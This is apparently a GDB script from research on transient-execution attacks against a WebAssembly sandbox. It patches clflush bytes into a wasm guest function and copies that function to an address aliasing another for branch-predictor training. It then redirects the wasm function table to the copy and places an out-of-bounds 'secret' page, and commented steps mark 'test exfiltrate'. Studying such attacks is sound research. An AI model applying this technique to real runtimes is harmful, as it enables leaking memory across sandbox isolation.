# load native .so which contains code for copycode()
set $soaddr = (void*) dlopen("./copycode.so", 2)
add-symbol-file "./copycode.so" $soaddr

# get address of fread()
set $freadaddr = (char*) &'guest_func_fread'
set $ftrainaddr = (char*) &'guest_func_ftrain'

# patch noopfunc call to flush
set $flushaddr= $freadaddr + 315
# clflush
print *($flushaddr + 0) = 0x0f
print *($flushaddr + 1) = 0xae
print *($flushaddr + 2) = 0x3d
# rip relative disp
print *($flushaddr + 3) = 0x17
print *($flushaddr + 4) = 0x00
print *($flushaddr + 5) = 0x00
print *($flushaddr + 6) = 0x00
# padding
print *($flushaddr + 7) = 0x66
print *($flushaddr + 8) = 0x0f
print *($flushaddr + 9) = 0x1f
print *($flushaddr + 10) = 0x84
print *($flushaddr + 11) = 0x00
print *($flushaddr + 12) = 0x00
print *($flushaddr + 13) = 0x00
print *($flushaddr + 14) = 0x00
print *($flushaddr + 15) = 0x00

print *($flushaddr + 16) = 0x0f
print *($flushaddr + 17) = 0x1f
print *($flushaddr + 18) = 0x44
print *($flushaddr + 19) = 0x00
print *($flushaddr + 20) = 0x00

# patch the first several instructions to access own memory, to test if the transient execution happens
#set $movaddr= $freadaddr + 235
#p *($movaddr + 0) = 0xbb
#p *($movaddr + 1) = 0x00
#p *($movaddr + 2) = 0x30
#p *($movaddr + 3) = 0x05
#p *($movaddr + 4) = 0x00
#p *($movaddr + 5) = 0x89
#p *($movaddr + 6) = 0xdb
#p *($movaddr + 7) = 0x41
#p *($movaddr + 8) = 0x8b
#p *($movaddr + 9) = 0x1c
#p *($movaddr + 10) = 0x1f
#p *($movaddr + 11) = 0x90
#p *($movaddr + 12) = 0x90
#p *($movaddr + 13) = 0x90
#p *($movaddr + 14) = 0x90



# get address of target function
set $targetaddr = (void*)((uint64_t)$ftrainaddr ^ ((uint64_t)1 << (uint64_t)32))

# call copycode with appropriate arguments
set $ret = (int) copycode($targetaddr, $freadaddr, 1300)

# ensure result was 0
if $ret != 0
print "!!!!!!! Error performing copycode !!!!!!!"
end

# patch fread call in wasm indirect function table to use the copied version
set $functable = (char*) &'guest_table_0'
set $functablerow = (char**)($functable + (1 << 4) + 0x8)
p *($functablerow) = $targetaddr

# place oob secret
print (void*) mmap(0x7FFEF606A000, 4096, 0x1 | 0x2 | 0x4, 0x20 | 0x02 | 0x10, -1, 0)
p *(0x7FFEF606A062) = 0x53

x/100i $targetaddr

# test exfiltrate
# b *($targetaddr + 100)
# c
# b *($targetaddr + 227)
# jump *($targetaddr + 227)
# si
# si
# si
# si
# si
# si
# si
# jump *($targetaddr + 100)
# delete breakpoints
# finish

# b *($targetaddr + 336)
# c







